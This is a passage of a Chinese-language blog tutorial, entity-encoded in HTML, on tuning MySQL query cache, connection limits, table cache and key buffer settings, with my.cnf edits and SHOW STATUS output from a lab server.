&#x5982;&#x679C;Qcache_free_blocks&#x6BD4;&#x8F83;&#x5927;&#xFF0C;&#x8BF4;&#x660E;&#x788E;&#x7247;&#x4E25;&#x91CD;&#xFF1B;&#x5982;&#x679C; free_memory &#x5F88;&#x5C0F;&#xFF0C;&#x8BF4;&#x660E;&#x7F13;&#x5B58;&#x4E0D;&#x591F;&#x7528;&#x4E86;</td></tr><tr><td>Qcache_not_cached</td><td>&#x6CA1;&#x6709;&#x8FDB;&#x884C;&#x7F13;&#x5B58;&#x7684;&#x67E5;&#x8BE2;&#x7684;&#x6570;&#x91CF;&#xFF0C;&#x901A;&#x5E38;&#x662F;&#x8FD9;&#x4E9B;&#x67E5;&#x8BE2;&#x672A;&#x88AB;&#x7F13;&#x5B58;&#x6216;&#x5176;&#x7C7B;&#x578B;&#x4E0D;&#x5141;&#x8BB8;&#x88AB;&#x7F13;&#x5B58;</td></tr><tr><td>Qcache_queries_in_cache</td><td>&#x5728;&#x5F53;&#x524D;&#x7F13;&#x5B58;&#x7684;&#x67E5;&#x8BE2;&#xFF08;&#x548C;&#x54CD;&#x5E94;&#xFF09;&#x7684;&#x6570;&#x91CF;</td></tr><tr><td>Qcache_total_blocks</td><td>&#x7F13;&#x5B58;&#x4E2D;&#x5757;&#x7684;&#x6570;&#x91CF;</td></tr></tbody></table><p>&#x4F8B;&#xFF1A;&#x4F7F;&#x7528;mysql&#x67E5;&#x8BE2;&#x7F13;&#x5B58;<br></p><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">[root@jaking ~]# cat /etc/my.cnf </span><br><span class="line">[mysqld]</span><br><span class="line">datadir=/data/mysql</span><br><span class="line">socket=/data/mysql/mysql.sock</span><br><span class="line">user=mysql</span><br><span class="line"><span class="meta">#</span><span class="bash"> Disabling symbolic-links is recommended to prevent assorted security risks</span></span><br><span class="line">symbolic-links=0</span><br><span class="line">query_cache_size=32M #&#x81F3;&#x5C11;4M&#x4EE5;&#x5B58;&#x50A8;&#x6570;&#x636E;&#x7ED3;&#x6784;&#xFF0C;&#x53EF;&#x6269;&#x5C55;&#xFF1B;&#x6574;&#x4F53;100G&#xFF0C;&#x82E5;&#x6B64;&#x670D;&#x52A1;&#x5668;&#x53EA;&#x8FD0;&#x884C;mysql&#x670D;&#x52A1;&#x5668;&#xFF0C;70-80G&#x7ED9;mysql</span><br><span class="line">[root@jaking ~]# systemctl restart mysqld</span><br></pre></td></tr></tbody></table></figure><p></p><figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">[root@jaking ~]<span class="comment"># mysql -uroot -pJaking@vip.163.com</span></span><br><span class="line">mysql&gt; create database aa;</span><br><span class="line">mysql&gt; use aa;</span><br><span class="line">mysql&gt; create table test (id int, name varchar(255)) ;</span><br><span class="line">mysql&gt; insert into test values (1,&apos;aaaa&apos;), (2,&apos;aaaa&apos;);</span><br><span class="line">mysql&gt; select * from test;</span><br><span class="line">mysql&gt; show status like &quot;qcache%&quot;;</span><br><span class="line">+<span class="comment">-------------------------+----------+</span></span><br><span class="line">| Variable_name&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; | Value&#xA0;&#xA0;&#xA0; |</span><br><span class="line">+<span class="comment">-------------------------+----------+</span></span><br><span class="line">| Qcache_free_blocks&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; | 1&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; |</span><br><span class="line">| Qcache_free_memory&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; | 33535112 |</span><br><span class="line">| Qcache_hits&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; | 0&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; |&#xA0;&#xA0; <span class="comment">-- &#x6CA1;&#x6709;&#x547D;&#x4E2D;</span></span><br><span class="line">| Qcache_inserts&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; | 1&#xA0;&#xA0;&#xA0;&#xA0; &#xA0;&#xA0;&#xA0;|&#xA0; <span class="comment">-- &#x7B2C;&#x4E00;&#x6B21;&#x63D2;&#x5165;&#x4E00;&#x6761;&#x8BED;&#x53E5;</span></span><br><span class="line">| Qcache_lowmem_prunes &#xA0;  | 0&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; |</span><br><span class="line">| Qcache_not_cached&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; | 3&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; |</span><br><span class="line">| Qcache_queries_in_cache | 1&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; |</span><br><span class="line">| Qcache_total_blocks&#xA0;&#xA0;&#xA0;&#xA0; | 4&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; |</span><br><span class="line"></span><br><span class="line"><span class="comment">-- &#x518D;&#x67E5;&#x8BE2;&#xFF1A;</span></span><br><span class="line">mysql&gt; select * from test;</span><br><span class="line">mysql&gt; show status like &quot;qcache%&quot;;</span><br><span class="line">+<span class="comment">-------------------------+----------+</span></span><br><span class="line">| Variable_name&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; | Value&#xA0;&#xA0;&#xA0; |</span><br><span class="line">+<span class="comment">-------------------------+----------+</span></span><br><span class="line">| Qcache_free_blocks&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; | 1&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; |</span><br><span class="line">| Qcache_free_memory&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; | 33535112 |</span><br><span class="line">| Qcache_hits&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; | 1        | <span class="comment">-- &#x7B2C;&#x4E8C;&#x6B21;&#x67E5;&#x8BE2;&#x65F6;&#xFF0C;&#x5C31;&#x547D;&#x4E2D;&#x4E86;</span></span><br><span class="line">| Qcache_inserts&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; | 1&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; |</span><br><span class="line"> </span><br><span class="line">Qcache_hits/&#xFF08;Qcache_inserts+ Qcache_hits&#xFF09; &#x547D;&#x4E2D;&#x7387;</span><br><span class="line"> </span><br><span class="line"><span class="comment">-- &#x7ECF;&#x8FC7;&#x591A;&#x6B21;select&#xFF0C;&#x547D;&#x4E2D;&#x7684;&#x6B21;&#x6570;&#x4E5F;&#x4F1A;&#x589E;&#x52A0;&#xFF1A;</span></span><br><span class="line">mysql&gt; show status like &apos;qcache%&apos;;&#xA0; </span><br><span class="line">+<span class="comment">-------------------------+----------+</span></span><br><span class="line">| Variable_name&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; | Value&#xA0;&#xA0;&#xA0; |</span><br><span class="line">+<span class="comment">-------------------------+----------+</span></span><br><span class="line">| Qcache_free_blocks&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; | 1&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; |</span><br><span class="line">| Qcache_free_memory&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; | 33535344 |</span><br><span class="line">| Qcache_hits&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; | 3&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; | <span class="comment">-- &#x7B2C;&#x56DB;&#x6B21;&#x67E5;&#x8BE2;&#x65F6;&#xFF0C;&#x5C31;&#x547D;&#x4E2D;3&#x6B21;</span></span><br><span class="line">| Qcache_inserts&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; | 1&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; |</span><br></pre></td></tr></tbody></table></figure><p>&#x5F3A;&#x5236;&#x9650;&#x5236;MySQL &#x8D44;&#x6E90;&#x8BBE;&#x7F6E;<br>&#x53EF;&#x4EE5;&#x5728;mysqld&#x4E2D;&#x5F3A;&#x5236;&#x4E00;&#x4E9B;&#x9650;&#x5236;&#x6765;&#x786E;&#x4FDD;&#x7CFB;&#x7EDF;&#x8D1F;&#x8F7D;&#x4E0D;&#x4F1A;&#x5BFC;&#x81F4;&#x8D44;&#x6E90;&#x8017;&#x5C3D;&#x7684;&#x60C5;&#x51B5;&#x51FA;&#x73B0;&#x3002;<br></p><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">[root@jaking ~]# vim /etc/my.cnf </span><br><span class="line">[mysqld]</span><br><span class="line">datadir=/data/mysql</span><br><span class="line">socket=/data/mysql/mysql.sock</span><br><span class="line">user=mysql</span><br><span class="line"><span class="meta">#</span><span class="bash"> Disabling symbolic-links is recommended to prevent assorted security risks</span></span><br><span class="line">symbolic-links=0</span><br><span class="line">query_cache_size = 32M </span><br><span class="line">max_connections=500&#xA0; #&#x4E0A;&#x9650;&#x662F;&#x770B;&#x786C;&#x4EF6;&#x914D;&#x7F6E;</span><br><span class="line">wait_timeout=10 </span><br><span class="line">max_connect_errors=100</span><br><span class="line">[root@jaking ~]# systemctl restart mysqld</span><br></pre></td></tr></tbody></table></figure><p></p><p><strong>&#x53C2;&#x6570;&#xFF1A;</strong><br>&#x7B2C;&#x4E00;&#x884C;&#xFF1A;&#x6700;&#x5927;&#x8FDE;&#x63A5;&#x6570;&#xFF0C;&#x5728;&#x670D;&#x52A1;&#x5668;&#x6CA1;&#x6709;&#x5D29;&#x6E83;&#x4E4B;&#x524D;&#x786E;&#x4FDD;&#x53EA;&#x5EFA;&#x7ACB;&#x670D;&#x52A1;&#x5141;&#x8BB8;&#x6570;&#x76EE;&#x7684;&#x8FDE;&#x63A5;<br>&#x8BE5;&#x53C2;&#x6570;&#x8BBE;&#x7F6E;&#x8FC7;&#x5C0F;&#x7684;&#x6700;&#x660E;&#x663E;&#x7279;&#x5F81;&#x662F;&#x51FA;&#x73B0;&#x201C;Too many connections&#x201D;&#x9519;&#x8BEF;  </p><p>&#x7B2C;&#x4E8C;&#x884C;&#xFF1A;mysqld&#x5C06;&#x7EC8;&#x6B62;&#x7B49;&#x5F85;&#x65F6;&#x95F4;&#xFF08;&#x7A7A;&#x95F2;&#x65F6;&#x95F4;&#xFF09;&#x8D85;&#x8FC7;10&#x79D2;&#x7684;&#x8FDE;&#x63A5;&#xFF1B;&#x5728;LAMP&#x5E94;&#x7528;&#x7A0B;&#x5E8F;&#x4E2D;&#xFF0C;&#x8FDE;&#x63A5;&#x6570;&#x636E;&#x5E93;&#x7684;&#x65F6;&#x95F4;&#x901A;&#x5E38;&#x5C31;&#x662F;Web &#x670D;&#x52A1;&#x5668;&#x5904;&#x7406;&#x8BF7;&#x6C42;&#x6240;&#x82B1;&#x8D39;&#x7684;&#x65F6;&#x95F4;&#xFF1B;&#x6709;&#x65F6;&#x5019;&#x5982;&#x679C;&#x8D1F;&#x8F7D;&#x8FC7;&#x91CD;&#xFF0C;&#x8FDE;&#x63A5;&#x4F1A;&#x6302;&#x8D77;&#xFF0C;&#x5E76;&#x4E14;&#x4F1A;&#x5360;&#x7528;&#x8FDE;&#x63A5;&#x8868;&#x7A7A;&#x95F4;&#xFF1B;&#x5982;&#x679C;&#x6709;&#x591A;&#x4E2A;&#x4EA4;&#x4E92;&#x7528;&#x6237;&#x4F7F;&#x7528;&#x4E86;&#x5230;&#x6570;&#x636E;&#x5E93;&#x7684;&#x6301;&#x4E45;&#x8FDE;&#x63A5;&#xFF0C;&#x90A3;&#x4E48;&#x5E94;&#x8BE5;&#x5C06;&#x8FD9;&#x4E2A;&#x503C;&#x8BBE;&#x4F4E;&#x4E00;&#x70B9;&#x3002;  </p><p>&#x7B2C;&#x4E09;&#x884C;&#xFF1A;&#x5982;&#x679C;&#x4E00;&#x4E2A;&#x4E3B;&#x673A;&#x5728;&#x8FDE;&#x63A5;&#x5230;&#x670D;&#x52A1;&#x5668;&#x65F6;&#x6709;&#x95EE;&#x9898;&#xFF0C;&#x5E76;&#x91CD;&#x8BD5;&#x5F88;&#x591A;&#x6B21;&#x540E;&#x653E;&#x5F03;&#xFF0C;&#x90A3;&#x4E48;&#x8FD9;&#x4E2A;&#x4E3B;&#x673A;&#x5C31;&#x4F1A;&#x88AB;&#x9501;&#x5B9A;&#xFF0C;&#x76F4;&#x5230;&#x6267;&#x884C;<br></p><figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; FLUSH HOSTS;</span><br><span class="line">Query OK, 0 rows affected (0.00 sec)</span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x4E4B;&#x540E;&#x624D;&#x80FD;&#x8FD0;&#x884C;&#x3002;  </p><p>&#x9ED8;&#x8BA4;&#x60C5;&#x51B5;&#x4E0B;&#xFF0C;10 &#x6B21;&#x5931;&#x8D25;&#x5C31;&#x8DB3;&#x4EE5;&#x5BFC;&#x81F4;&#x9501;&#x5B9A;&#x4E86;&#xFF1B;&#x5C06;&#x8FD9;&#x4E2A;&#x503C;&#x4FEE;&#x6539;&#x4E3A;100 &#x4F1A;&#x7ED9;&#x670D;&#x52A1;&#x5668;&#x8DB3;&#x591F;&#x7684;&#x65F6;&#x95F4;&#x6765;&#x4ECE;&#x95EE;&#x9898;&#x4E2D;&#x6062;&#x590D;&#xFF1B;&#x5982;&#x679C;&#x91CD;&#x8BD5;100 &#x6B21;&#x90FD;&#x65E0;&#x6CD5;&#x5EFA;&#x7ACB;&#x8FDE;&#x63A5;&#xFF0C;&#x90A3;&#x4E48;&#x4F7F;&#x7528;&#x518D;&#x9AD8;&#x7684;&#x503C;&#x4E5F;&#x4E0D;&#x4F1A;&#x6709;&#x592A;&#x591A;&#x5E2E;&#x52A9;&#xFF0C;&#x53EF;&#x80FD;&#x5B83;&#x6839;&#x672C;&#x5C31;&#x65E0;&#x6CD5;&#x8FDE;&#x63A5;&#x3002;  </p><p>&#x9A8C;&#x8BC1;&#xFF1A;<br></p><figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">[root@jaking ~]<span class="comment"># mysql -uroot -pJaking@vip.163.com</span></span><br><span class="line">mysql&gt; show status like &apos;max_used_connections&apos;;</span><br><span class="line">+<span class="comment">----------------------+-------+</span></span><br><span class="line">| Variable_name&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; | Value |</span><br><span class="line">+<span class="comment">----------------------+-------+</span></span><br><span class="line">| Max_used_connections | 1&#xA0; |<span class="comment">#&#x5F53;&#x524D;&#x6709;&#x4E00;&#x4E2A;mysql&#x8FDE;&#x63A5;</span></span><br><span class="line">+<span class="comment">----------------------+-------+</span></span><br><span class="line">1 row in <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">&#x518D;&#x53E6;&#x4E00;&#x4E2A;&#x5BA2;&#x6237;&#x7AEF;&#x6253;&#x5F00;&#x4E00;&#x4E2A;mysql&#x8FDE;&#x63A5;&#xFF0C;&#x6267;&#x884C;&#x4E00;&#x4E0B;&#x67E5;&#x8BE2;&#xFF0C;&#x53EF;&#x4EE5;&#x770B;&#x5230;&#x6709;&#x4E24;&#x4E2A;</span><br><span class="line">[root@jaking ~]<span class="comment"># mysql -uroot -pJaking@vip.163.com</span></span><br><span class="line">mysql&gt; <span class="keyword">show</span> <span class="keyword">status</span> <span class="keyword">like</span> <span class="string">&apos;max_used_connections&apos;</span>;</span><br><span class="line">+<span class="comment">----------------------+-------+</span></span><br><span class="line">| Variable_name&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; | Value |</span><br><span class="line">+<span class="comment">----------------------+-------+</span></span><br><span class="line">| Max_used_connections | 2&#xA0; |</span><br></pre></td></tr></tbody></table></figure><p></p><p><strong>&#x603B;&#x7ED3;&#xFF1A;</strong><br>mysql&#x6709;&#x8D85;&#x8FC7;100&#x4E2A;&#x53EF;&#x4EE5;&#x8C03;&#x8282;&#x7684;&#x8BBE;&#x7F6E;&#xFF0C;&#x8981;&#x8BB0;&#x4F4F;&#x90A3;&#x4E48;&#x591A;&#x57FA;&#x672C;&#x662F;&#x4E0D;&#x53EF;&#x80FD;&#x7684;&#xFF0C;&#x4F46;&#x662F;&#x5E78;&#x8FD0;&#x7684;&#x662F;&#x4F60;&#x53EA;&#x9700;&#x8981;&#x8BB0;&#x4F4F;&#x5F88;&#x5C11;&#x4E00;&#x90E8;&#x5206;&#x4F60;&#x5C31;&#x53EF;&#x4EE5;&#x57FA;&#x672C;&#x6EE1;&#x8DB3;&#x4F60;&#x7684;&#x9700;&#x6C42;&#x4E86;&#xFF0C;&#x6211;&#x4EEC;&#x8FD8;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;&#x201C;SHOW STATUS&#x201D;&#x547D;&#x4EE4;&#x6765;&#x67E5;&#x770B;mysql&#x662F;&#x5426;&#x6309;&#x7167;&#x6211;&#x4EEC;&#x7684;&#x671F;&#x671B;&#x5728;&#x8FD0;&#x884C;  </p><p><strong>&#x8868;&#x9AD8;&#x901F;&#x7F13;&#x5B58;&#xFF1A;</strong><br>&#x6570;&#x636E;&#x5E93;&#x4E2D;&#x7684;&#x6BCF;&#x4E2A;&#x8868;&#x5B58;&#x50A8;&#x5728;&#x4E00;&#x4E2A;&#x6587;&#x4EF6;&#x4E2D;&#xFF0C;&#x8981;&#x8BFB;&#x53D6;&#x6587;&#x4EF6;&#x7684;&#x5185;&#x5BB9;&#xFF0C;&#x4F60;&#x5FC5;&#x987B;&#x5148;&#x6253;&#x5F00;&#x6587;&#x4EF6;&#xFF0C;&#x7136;&#x540E;&#x518D;&#x8BFB;&#x53D6;&#xFF1B;&#x4E3A;&#x4E86;&#x52A0;&#x5FEB;&#x4ECE;&#x6587;&#x4EF6;&#x4E2D;&#x8BFB;&#x53D6;&#x6570;&#x636E;&#x7684;&#x8FC7;&#x7A0B;&#xFF0C;mysqld &#x5BF9;&#x8FD9;&#x4E9B;&#x6253;&#x5F00;&#x6587;&#x4EF6;&#x8FDB;&#x884C;&#x4E86;&#x7F13;&#x5B58;&#xFF0C;&#x5176;&#x6700;&#x5927;&#x6570;&#x76EE;&#x7531; /etc/my.cnf&#x4E2D;&#x7684; table_open_cache &#x6307;&#x5B9A;  </p><p>&#x4F8B;&#x5982;&#xFF1A;<br></p><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">[root@jaking ~]# vim /etc/my.cnf </span><br><span class="line">[mysqld] </span><br><span class="line">datadir=/var/lib/mysql </span><br><span class="line">&#x2026;&#x2026; </span><br><span class="line">table_open_cache=24 &#xA0;#&#x7F13;&#x5B58;24&#x4E2A;&#x8868; </span><br><span class="line"> </span><br><span class="line">[root@jaking ~]# systemctl restart mysqld</span><br><span class="line">[root@jaking ~]# mysql -uroot -pJaking@vip.163.com</span><br><span class="line"><span class="meta">mysql&gt;</span><span class="bash">&#xA0; show global status like <span class="string">&apos;open%_tables&apos;</span>;</span></span><br><span class="line">+---------------+-------+</span><br><span class="line">| Variable_name | Value |</span><br><span class="line">+---------------+-------+</span><br><span class="line">| Open_tables&#xA0;&#xA0; | 1&#xA0;&#xA0;&#xA0;&#xA0; |</span><br><span class="line">| Opened_tables | 114&#xA0;&#xA0; |</span><br><span class="line">+---------------+-------+</span><br></pre></td></tr></tbody></table></figure><p></p><p>Open_tables &#x8868;&#x793A;&#x6253;&#x5F00;&#x8868;&#x7684;&#x6570;&#x91CF;&#xFF0C;Opened_tables&#x8868;&#x793A;&#x6253;&#x5F00;&#x8FC7;&#x7684;&#x8868;&#x6570;&#x91CF;&#xFF0C;&#x5982;&#x679C;Opened_tables&#x6570;&#x91CF;&#x8FC7;&#x5927;&#xFF0C;&#x8BF4;&#x660E;&#x914D;&#x7F6E;&#x4E2D; table_cache(5.1.3&#x4E4B;&#x540E;&#x8FD9;&#x4E2A;&#x503C;&#x53EB;&#x505A;table_open_cache)&#x503C;&#x53EF;&#x80FD;&#x592A;&#x5C0F;<br>table_cache &#x7684;&#x503C;&#x5728; 2G &#x5185;&#x5B58;&#x4EE5;&#x4E0B;&#x7684;&#x673A;&#x5668;&#x4E2D;&#x7684;&#x503C;&#x9ED8;&#x8BA4;&#x4ECE; 256 &#x5230; 512&#x4E2A;<br>&#x5BF9;&#x4E8E;&#x6709; 1G &#x5185;&#x5B58;&#x7684;&#x673A;&#x5668;&#xFF0C;&#x63A8;&#x8350;&#x503C;&#x662F; 128-256  </p><p>&#x5173;&#x952E;&#x5B57;&#x7F13;&#x51B2;&#x533A;<br>key_buffer_size&#x6307;&#x5B9A;&#x7D22;&#x5F15;&#x7F13;&#x51B2;&#x533A;&#x7684;&#x5927;&#x5C0F;&#xFF0C;&#x5B83;&#x51B3;&#x5B9A;&#x7D22;&#x5F15;&#x5904;&#x7406;&#x7684;&#x901F;&#x5EA6;&#xFF0C;&#x5C24;&#x5176;&#x662F;&#x7D22;&#x5F15;&#x8BFB;&#x7684;&#x901F;&#x5EA6;  </p><p>&#x4F8B;&#xFF1A;&#x5173;&#x952E;&#x5B57;&#x7F13;&#x5B58; , &#x7F13;&#x5B58;&#x6765;&#x7F13;&#x5B58;&#x7D22;&#x5F15;<br></p><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">[root@jaking ~]# vim /etc/my.cnf </span><br><span class="line">[mysqld]</span><br><span class="line">datadir=/var/lib/mysql</span><br><span class="line">&#x2026;&#x2026;</span><br><span class="line">key_buffer_size=512M</span><br><span class="line"><span class="meta">#</span><span class="bash">&#x53EA;&#x8DD1;&#x4E00;&#x4E2A;mysql&#x670D;&#x52A1;&#xFF0C;&#x7ED3;&#x5408;&#x6240;&#x6709;&#x7F13;&#x5B58;&#xFF0C;mysql&#x6574;&#x4F53;&#x4F7F;&#x7528;&#x7684;&#x7F13;&#x5B58;&#x53EF;&#x4EE5;&#x4F7F;&#x7528;&#x7269;&#x7406;&#x5185;&#x5B58;&#x7684;80%</span></span><br><span class="line">[root@jaking ~]# systemctl restart mysqld</span><br><span class="line"></span><br><span class="line">&#x67E5;&#x770B;&#xFF1A;</span><br><span class="line">[root@jaking ~]# mysql -uroot -pJaking@vip.163.com</span><br><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> show status like <span class="string">&apos;%key_read%&apos;</span>;</span></span><br><span class="line">+-------------------+-------+</span><br><span class="line">| Variable_name&#xA0;&#xA0;&#xA0;&#xA0; | Value |</span><br><span class="line">+-------------------+-------+</span><br><span class="line">| Key_read_requests | 6&#xA0;&#xA0;&#xA0;&#xA0; |</span><br><span class="line">| Key_reads&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; | 3&#xA0;&#xA0;&#xA0;&#xA0; |</span><br><span class="line">+-------------------+-------+</span><br><span class="line">2 rows in set (0.00 sec)</span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x5173;&#x952E;&#x5B57;&#xFF0C;&#x7406;&#x60F3;&#x60C5;&#x51B5;&#x4E0B;&#x5BF9;&#x4E8E;&#x4ED6;&#x7684;&#x8BF7;&#x6C42;&#x5E94;&#x8BE5;&#x6765;&#x81EA;&#x4E8E;&#x5185;&#x5B58;&#x800C;&#x4E0D;&#x662F;&#x78C1;&#x76D8;&#xFF0C;&#x4ECE;&#x8FD9;&#x4E2A;&#x8868;&#x4E2D;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x770B;&#x51FA;&#x6709;&#x591A;&#x5C11;&#x662F;Key_reads &#x4EE3;&#x8868;&#x547D;&#x4E2D;&#x78C1;&#x76D8;&#x7684;&#x8BF7;&#x6C42;&#x4E2A;&#x6570;&#xFF0C;Key_read_requests &#x662F;&#x603B;&#x6570;&#xFF0C; &#x547D;&#x4E2D;&#x78C1;&#x76D8;&#x7684;&#x8BFB;&#x8BF7;&#x6C42;&#x6570;&#x9664;&#x4EE5;&#x8BFB;&#x8BF7;&#x6C42;&#x603B;&#x6570;&#x5C31;&#x662F;&#x4E0D;&#x4E2D;&#x6BD4;&#x7387;&#xFF1B;&#x5982;&#x679C;&#x6BCF; 1000 &#x4E2A;&#x8BF7;&#x6C42;&#x4E2D;&#x547D;&#x4E2D;&#x78C1;&#x76D8;&#x7684;&#x6570;&#x76EE;&#x8D85;&#x8FC7; 1 &#x4E2A;&#xFF0C;&#x5C31;&#x5E94;&#x8BE5;&#x8003;&#x8651;&#x589E;&#x5927;&#x5173;&#x952E;&#x5B57;&#x7F13;&#x51B2;&#x533A;&#x4E86;<br>&#x547D;&#x4E2D;&#x7387;&#xFF1A;(1-(Key_reads / Key_read_requests ) )*100  </p><figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">[root@jaking ~]<span class="comment"># mysql -uroot -pJaking@vip.163.com</span></span><br><span class="line">mysql&gt; create database jaking;</span><br><span class="line"> <span class="keyword">use</span> jaking;</span><br><span class="line"> <span class="keyword">create</span> <span class="keyword">table</span> test2 (<span class="keyword">id</span> <span class="built_in">int</span>,<span class="keyword">name</span> <span class="built_in">varchar</span>(<span class="number">24</span>));</span><br><span class="line"> <span class="keyword">insert</span> <span class="keyword">into</span> test2 <span class="keyword">values</span> (<span class="number">1</span>,<span class="string">&apos;aaaaa&apos;</span>),(<span class="number">2</span>,<span class="string">&apos;aaaaa&apos;</span>),(<span class="number">3</span>,<span class="string">&apos;aaaaa&apos;</span>);</span><br><span class="line"> <span class="keyword">create</span> <span class="keyword">index</span> idx_name <span class="keyword">on</span> test2(<span class="keyword">name</span>);</span><br><span class="line">mysql&gt; show status like &apos;%key_read%&apos;;</span><br><span class="line">+<span class="comment">-------------------+-------+</span></span><br><span class="line">| Variable_name&#xA0;&#xA0;&#xA0;&#xA0; | Value |</span><br><span class="line">+<span class="comment">-------------------+-------+</span></span><br><span class="line">| Key_read_requests | 6&#xA0;&#xA0;&#xA0;&#xA0; 